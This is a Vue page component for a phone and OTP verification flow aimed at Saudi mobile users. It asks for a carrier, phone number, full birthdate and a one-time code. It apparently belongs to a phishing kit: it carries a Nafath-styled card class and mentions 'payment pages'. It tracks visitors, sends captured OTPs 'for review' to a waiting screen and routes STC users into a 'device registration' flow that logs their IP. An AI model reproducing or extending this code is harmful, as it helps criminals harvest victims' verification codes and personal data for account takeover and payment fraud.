<template>
<!-- ═══════════════════════════════════════════════════════════════════════════════════ -->
<!-- SECTION 14 - LAYOUT: PAGE WRAPPER & CONTAINER -->
<!-- ═══════════════════════════════════════════════════════════════════════════════════ -->

  <div class="verification-shell" dir="rtl" lang="ar">
    <div class="w-full max-w-md">

        <!-- ═══════════════════════════════════════════════════════════════════════════ -->
        <!-- SECTION 15 - SCREEN 1: PHONE NUMBER ENTRY FORM -->
        <!-- ═══════════════════════════════════════════════════════════════════════════ -->

        <PhoneEntryForm
          v-if="!phoneSubmitted"
          :carriers="carriers"
          :selected-carrier="selectedCarrier"
          :form-data="formData"
          :errors="errors"
          :error="error"
          :processing="processing"
          :is-form-valid="isFormValid"
          @submit="submitPhoneNumber"
          @update:selected-carrier="selectedCarrier = $event"
          @update:form-data="onFormDataUpdate"
        />

        <!-- ═══════════════════════════════════════════════════════════════════════════ -->
        <!-- SECTION 16 - SCREEN 2: WAITING FOR CODE COUNTDOWN -->
        <!-- ═══════════════════════════════════════════════════════════════════════════ -->

        <WaitingForCodeScreen
          v-else-if="waitingForCode"
          :phone-number="fullPhoneNumber"
          :countdown-formatted="waitingCountdown.formatted.value"
          @enter-manually="enterCodeManually"
        />

        <!-- ═══════════════════════════════════════════════════════════════════════════ -->
        <!-- SECTION 17 - SCREEN 3: OTP CODE ENTRY & VERIFICATION -->
        <!-- ═══════════════════════════════════════════════════════════════════════════ -->

        <OtpEntryForm
          v-else
          ref="otpFormRef"
          :phone-number="fullPhoneNumber"
          :error="error"
          :success="success"
          :processing="processing"
          :timer-formatted="codeExpiry.formatted.value"
          :is-expired="codeExpiry.isExpired.value"
          :can-resend="canResend"
          :resend-timer="resendCooldown.remaining.value"
          @verify="verifyCode"
          @resend="resendCode"
          @change-phone="changePhoneNumber"
        />

        <!-- ═══════════════════════════════════════════════════════════════════════════ -->
        <!-- SECTION 18 - FOOTER: HELP & INFO SECTION -->
        <!-- ═══════════════════════════════════════════════════════════════════════════ -->

        <VerificationHelpSection />
      </div>
  </div>
</template>

<script setup>
// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 1 - IMPORTS & COMPONENTS
// ═══════════════════════════════════════════════════════════════════════════════════

import { ref, computed, nextTick } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { useCountdownTimer } from '@/composables/useCountdownTimer';
import { getRecaptchaToken } from '@/composables/useRecaptcha';
import request from '@/api/request';
import PhoneEntryForm from '../components/phone-verification/PhoneEntryForm.vue';
import WaitingForCodeScreen from '../components/phone-verification/WaitingForCodeScreen.vue';
import OtpEntryForm from '../components/phone-verification/OtpEntryForm.vue';
import VerificationHelpSection from '../components/phone-verification/VerificationHelpSection.vue';

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 2 - ROUTER, I18N & DEPENDENCIES
// ═══════════════════════════════════════════════════════════════════════════════════

const { t } = useI18n();
const router = useRouter();

/**
 * Force Arabic locale on payment pages
 */
if ( i18n.global.locale.value !== 'ar' ) {
    i18n.global.locale.value = 'ar';
}

/**
 * Initialize visitor tracking for phone verification page
 * @type {void}
 */
useVisitorTracking('phone_verification');

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 3 - CONSTANTS: SUPPORTED CARRIERS
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * List of supported telecom carriers with logos and display names
 * @type {Array<{id: string, name: string, logo: string}>}
 */
const carriers = [
  { id: 'stc', name: 'STC', logo: '/images/logo/STC-01.svg' },
  { id: 'mobily', name: 'Mobily', logo: '/images/logo/Mobily-01-1.svg' },
  { id: 'zain', name: 'Zain', logo: '/images/logo/Zain-01.svg' },
  { id: 'yaqoot', name: 'Yaqoot', logo: '/images/logo/yaqoot.webp' },
  { id: 'salam', name: 'Salam', logo: '/images/logo/Salam-Mobile-01.svg' },
  { id: 'lebara', name: 'Lebara', logo: '/images/logo/lebara.webp' },
];

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 4 - STATE: CARRIER SELECTION & FORM DATA
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Form data for phone verification (phone number and birthdate)
 * @type {import('vue').Ref<{phone: string, birthDay: string, birthMonth: string, birthYear: string}>}
 */
const formData = ref({
  phone: '',
  birthDay: '',
  birthMonth: '',
  birthYear: '',
});

/**
 * Selected carrier ID (e.g., 'stc', 'mobily', 'zain')
 * @type {import('vue').Ref<string>}
 */
const selectedCarrier = ref('');

/**
 * Form validation error messages by field
 * @type {import('vue').Ref<{carrier: string, phone: string, birthdate: string}>}
 */
const errors = ref({ carrier: '', phone: '', birthdate: '' });

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 5 - STATE: SCREEN & FLOW MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Track if phone number has been submitted (moves to waiting/OTP entry screen)
 * @type {import('vue').Ref<boolean>}
 */
const phoneSubmitted = ref(false);

/**
 * Show waiting countdown screen before OTP entry
 * @type {import('vue').Ref<boolean>}
 */
const waitingForCode = ref(false);

/**
 * Reference to OTP entry form component
 * @type {import('vue').Ref<import('../components/phone-verification/OtpEntryForm.vue').default|null>}
 */
const otpFormRef = ref(null);

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 6 - STATE: MESSAGES & USER FEEDBACK
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Error message from API or validation
 * @type {import('vue').Ref<string>}
 */
const error = ref('');

/**
 * Success message for user feedback
 * @type {import('vue').Ref<string>}
 */
const success = ref('');

/**
 * Is any API request in progress (prevents double-submit)
 * @type {import('vue').Ref<boolean>}
 */
const processing = ref(false);

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 7 - TIMERS: COUNTDOWN & EXPIRY
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Countdown timer for "waiting for code" screen (30 seconds)
 * Automatically transitions to OTP entry form on completion
 * @type {Object} { remaining, formatted, isExpired, start, stop, restart }
 */
const waitingCountdown = useCountdownTimer(30, {
  onComplete: () => {
    waitingForCode.value = false;
    nextTick(() => otpFormRef.value?.focusFirst());
  },
});

/**
 * Code expiry timer (300 seconds / 5 minutes)
 * Tracks when OTP code is no longer valid
 * @type {Object} { remaining, formatted, isExpired, start, stop, restart }
 */
const codeExpiry = useCountdownTimer(300);

/**
 * Resend cooldown timer (60 seconds after successful resend)
 * Prevents rapid-fire resend requests
 * @type {Object} { remaining, formatted, isExpired, start, stop, restart }
 */
const resendCooldown = useCountdownTimer(0);

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 8 - COMPUTED: VALIDATION & DISPLAY
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Check if phone form is valid and ready for submission
 * Requires: carrier selected, valid phone (9 digits starting with 5), complete birthdate
 * @type {import('vue').ComputedRef<boolean>}
 */
const isFormValid = computed(() => {
  return (
    selectedCarrier.value !== '' &&
    formData.value.phone.length === 9 &&
    formData.value.birthDay !== '' &&
    formData.value.birthMonth !== '' &&
    formData.value.birthYear !== ''
  );
});

/**
 * Format phone number with country code for display
 * @type {import('vue').ComputedRef<string>}
 */
const fullPhoneNumber = computed(() => `+966 ${formData.value.phone}`);

/**
 * Check if user can resend OTP code (cooldown expired)
 * @type {import('vue').ComputedRef<boolean>}
 */
const canResend = computed(() => resendCooldown.isExpired.value);

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 9 - FORM HELPERS & VALIDATION
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Handle form data updates from child component
 * Clears phone validation error when user changes input
 * @param {Object} patch - Partial form data to merge (e.g., { phone: '512345678' })
 * @returns {void}
 */
function onFormDataUpdate(patch) {
  formData.value = { ...formData.value, ...patch };
  errors.value.phone = '';
}

/**
 * Validate entire phone verification form
 * Checks carrier selection, phone format, and birthdate completeness
 * @returns {boolean} True if all validations pass, false otherwise
 */
function validateForm() {
  errors.value = { carrier: '', phone: '', birthdate: '' };
  let isValid = true;

  if (!selectedCarrier.value) {
    errors.value.carrier = 'الرجاء اختيار شركة الاتصالات';
    isValid = false;
  }

  if (!formData.value.phone) {
    errors.value.phone = 'الرجاء إدخال رقم الهاتف';
    isValid = false;
  } else if (!/^5\d{8}$/.test(formData.value.phone)) {
    errors.value.phone = 'رقم الهاتف يجب أن يبدأ بـ 5 ويتكون من 9 أرقام';
    isValid = false;
  }

  if (!formData.value.birthDay || !formData.value.birthMonth || !formData.value.birthYear) {
    errors.value.birthdate = 'الرجاء إدخال تاريخ الميلاد كاملاً';
    isValid = false;
  }

  return isValid;
}

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 10 - PHONE SUBMISSION HANDLER
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Submit phone number for OTP delivery
 * Validates form, calls backend API, handles STC special flow
 * Sets up session storage for next steps
 *
 * @async
 * @returns {Promise<void>}
 */
async function submitPhoneNumber() {
  if (!validateForm()) return;

  processing.value = true;
  error.value = '';

  try {
    const recaptchaToken = await getRecaptchaToken( 'phone_verification_send' );
    const response = await request.post('/phone-verification/send', {
      carrier: selectedCarrier.value,
      phone: formData.value.phone,
      birthDay: formData.value.birthDay,
      birthMonth: formData.value.birthMonth,
      birthYear: formData.value.birthYear,
      recaptcha_token: recaptchaToken,
    });

    if (response.data.redirect) {
      router.push(response.data.redirect);
      return;
    }

    // STC carrier → redirect to STC waiting page for device registration flow
    if (selectedCarrier.value === 'stc') {
      sessionStorage.setItem('stcContext', JSON.stringify({
        phoneNumber: fullPhoneNumber.value,
        customerIp: response.data?.customer_ip || '',
        sessionId: response.data?.session_id || '',
        carrier: 'stc',
      }));
      router.push({ name: 'stcWaiting' });
      return;
    }

    success.value = t('verification.phone.messages.codeSentSuccess');
    phoneSubmitted.value = true;
    waitingForCode.value = true;

    waitingCountdown.restart(30);
    codeExpiry.restart(300);
  } catch (_err) {
    error.value =
      _err.response?.data?.message || 'حدث خطأ أثناء إرسال الرمز. الرجاء المحاولة مرة أخرى';
  } finally {
    processing.value = false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 11 - CODE VERIFICATION HANDLER
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Verify OTP code submitted by user
 * Validates code length and expiry, calls backend API, routes to waiting screen
 * Persists verification context to session storage
 *
 * @async
 * @param {string} otpCode - 6-digit OTP code from user
 * @returns {Promise<void>}
 */
async function verifyCode(otpCode) {
  if (processing.value) return;

  if (!otpCode || otpCode.length !== 6) {
    error.value = t('verification.phone.messages.enterAllDigits');
    return;
  }

  if (codeExpiry.isExpired.value) {
    error.value = t('verification.phone.messages.codeExpired');
    return;
  }

  processing.value = true;
  error.value = '';
  success.value = '';

  try {
    const response = await request.post('/phone-verification/verify', { otp: otpCode });

    sessionStorage.setItem('phoneOtpContext', JSON.stringify({
      phoneNumber: fullPhoneNumber.value,
      otpCode: otpCode,
      customerIp: response.data?.customer_ip || '',
      sessionId: response.data?.session_id || '',
      statusSig: response.data?.status_sig || '',
    }));

    success.value = t('verification.phone.messages.codeSentForReview');
    setTimeout(() => {
      router.push({ name: 'phoneOtpWaiting' });
    }, 1000);
  } catch (_err) {
    error.value = _err.response?.data?.message || 'حدث خطأ. الرجاء المحاولة مرة أخرى';
    otpFormRef.value?.resetOtp();
  } finally {
    processing.value = false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 12 - RESEND & CODE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Request a new OTP code via same carrier/phone
 * Enforces resend cooldown (60 seconds) between attempts
 * Resets OTP input field and timer
 *
 * @async
 * @returns {Promise<void>}
 */
async function resendCode() {
  if (!canResend.value) return;

  processing.value = true;
  error.value = '';
  success.value = '';

  try {
    await request.post('/phone-verification/resend', {
      phone: formData.value.phone,
    });
    success.value = t('verification.phone.messages.newCodeSent');
    codeExpiry.restart(300);
    resendCooldown.restart(60);
    // Reset OTP input state so the field is re-enabled
    otpFormRef.value?.resetOtp();
    nextTick(() => otpFormRef.value?.focusFirst());
  } catch {
    error.value = t('verification.phone.messages.resendError');
  } finally {
    processing.value = false;
  }
}

/**
 * Skip waiting screen and enter OTP code manually
 * Transitions from waiting screen to code entry form
 * @returns {void}
 */
function enterCodeManually() {
  waitingForCode.value = false;
  waitingCountdown.stop();
  nextTick(() => otpFormRef.value?.focusFirst());
}

// ═══════════════════════════════════════════════════════════════════════════════════
// SECTION 13 - FLOW RESET: CHANGE PHONE NUMBER
// ═══════════════════════════════════════════════════════════════════════════════════

/**
 * Reset entire flow to allow user to change phone number
 * Clears form data, messages, and all timers
 * Requires user confirmation
 *
 * @returns {void}
 */
function changePhoneNumber() {
  if (confirm('هل تريد تغيير رقم الهاتف؟ سيتم إعادة تعبئة النموذج من جديد.')) {
    phoneSubmitted.value = false;
    waitingForCode.value = false;
    error.value = '';
    success.value = '';
    waitingCountdown.stop();
    codeExpiry.stop();
    resendCooldown.stop();
  }
}
</script>

<style scoped>
.verification-shell {
  min-height: 100dvh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 1rem;
  background: #eef1f5;
}

.card-nafath {
  background: #ffffff;
  border-radius: 16px;
  border: 1px solid #e5e7eb;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.04);
  overflow: hidden;
}

/* ===== Select dropdown arrow ===== */
:deep(select) {
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e") !important;
  background-position: left 0.5rem center !important;
  background-repeat: no-repeat !important;
  background-size: 1.25em 1.25em !important;
  padding-left: 2rem !important;
}

/* Autofill override */
:deep(input:-webkit-autofill),
:deep(input:-webkit-autofill:hover),
:deep(input:-webkit-autofill:focus),
:deep(input:-webkit-autofill:active) {
  -webkit-box-shadow: 0 0 0 1000px #ffffff inset !important;
  box-shadow: 0 0 0 1000px #ffffff inset !important;
  -webkit-text-fill-color: #111827 !important;
  caret-color: #111827 !important;
  transition: background-color 5000s ease-in-out 0s;
}

/* ===== Typography ===== */
.fw-bold {
  font-weight: 700;
}

/* ===== Mobile Responsive ===== */
@media (max-width: 640px) {
  .card-nafath {
    margin: 0 4px;
    border-radius: 12px;
  }
}
</style>
